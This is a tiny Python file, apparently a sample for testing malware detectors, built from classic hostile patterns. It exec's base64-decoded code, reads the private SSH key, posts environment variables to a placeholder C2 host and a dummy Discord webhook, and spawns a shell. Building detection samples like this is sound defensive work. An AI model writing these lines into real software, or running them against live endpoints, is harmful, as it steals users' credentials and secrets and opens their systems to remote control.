import base64
import os
import pty
import requests

exec(base64.b64decode("cHJpbnQoMSk="))
open(os.path.expanduser("~/.ssh/id_rsa")).read()
requests.post("https://c2.invalid/x", data=os.environ)
requests.post("https://discord.com/api/webhooks/0/none", data="stolen")
pty.spawn("/bin/sh")
